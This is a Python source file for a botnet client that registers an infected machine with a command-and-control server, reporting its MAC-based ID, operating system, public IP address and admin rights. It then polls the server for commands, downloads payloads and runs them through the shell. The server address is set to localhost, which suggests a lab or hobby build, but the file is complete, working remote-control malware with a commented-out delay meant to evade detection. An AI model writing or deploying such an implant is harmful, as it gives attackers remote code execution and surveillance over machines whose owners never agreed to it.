import requests
import time
import subprocess
import ctypes
import os
import re, uuid
import platform
import random
import json

C2_URL = "http://127.0.0.1:8000/control/"
BOT_ID = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
POLLING_INTERVAL = 30

#time.sleep(random.randint(60, 120))

def is_admin():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    return is_admin

def os_info():
    if platform.system() == "Windows":
        return platform.system() + " " + platform.release() + " " + platform.version()
    elif platform.system() == "Linux":
        return platform.freedesktop_os_release()["NAME"] + " " + platform.release()

def register():
    try:
        print("[+] Registering bot ID: " + str(BOT_ID))
        info = {
            "mac": BOT_ID,
            "os": os_info(),
            "arch": platform.architecture()[0],
            "ip_address": requests.get('https://api4.ipify.org').text,
            "privileges": "admin" if is_admin() else "user"
            
        }
        response = requests.post(C2_URL + 'register/', json=info)
        if response.status_code == 200:
            print("[+] Registration successful")
        else:
            print("[-] Registration failed: " + str(response.status_code))
    except Exception as e:
        print("[-] Error registering with C2: " + str(e))

def download_and_execute(payload_url, args):
    try:
        print("[+] Downloading payload from " + payload_url)
        response = requests.get(payload_url)
        
        if response.status_code == 200:
            payload_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.path.basename(payload_url))
            with open(payload_path, "wb") as file:
                file.write(response.content)

            print("[+] Payload downloaded to " + payload_path)

            if isinstance(args, str):
                try:
                    args_dict = json.loads(args)
                    parsed_args = " ".join(args_dict[key] for key in sorted(args_dict.keys(), key=lambda k: k.split('[')[-1].strip(']')))
                except json.JSONDecodeError:
                    parsed_args = args
            else:
                parsed_args = str(args)

            if payload_path.endswith(".py"):
                command = f"python3 {payload_path} {parsed_args}"
            else:
                command = f"{payload_path} {parsed_args}"
                
            print("[+] Executing payload: " + str(command))

            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            print("[+] Execution result: " + result.decode('utf-8'))
            return result.decode('utf-8')
        else:
            return "Failed to download payload: " + str(response.status_code)
    except Exception as e:
        return str(e)


def poll_for_commands():
    while True:
        try:
            print("[+] Polling for commands from C2... Bot ID: " + str(BOT_ID))
            response = requests.get(C2_URL + "command/", params={"mac": BOT_ID}, timeout=30)
            if response.status_code == 200:
                command = response.json().get("command")
                payload_url = response.json().get("payload_url")
                args = response.json().get("args")

                if command:
                    print("[+] Received command: " + command)
                    
                    if command != "shell":
                        if payload_url:
                            download_and_execute(C2_URL + "modules" + payload_url, args if args else "")
                        send_execution_result()
                else:
                    print("[+] No command received")

            else:
                print("[-] Failed to poll: " + str(response.status_code))
                time.sleep(3)
        
        except requests.exceptions.Timeout:
            print("[+] Polling timed out, retrying...")
            time.sleep(POLLING_INTERVAL)
        except Exception as e:
            print("[-] Error polling for commands: " + str(e))
            time.sleep(POLLING_INTERVAL)

def send_execution_result():
    try:
        payload = {
            "mac": BOT_ID,
        }
        response = requests.post(C2_URL + "post_result/", json=payload)
        if response.status_code == 200:
            print("[+] Successfully sent execution result to C2.")
        else:
            print(f"[-] Failed to send execution result: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[-] Error sending execution result: {str(e)}")

def execute_shell_command(command):
    try:
        print("[+] Executing command: " + command)
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return "Command failed"
    except Exception as e:
        return str(e)


if __name__ == "__main__":
    register()
    poll_for_commands()
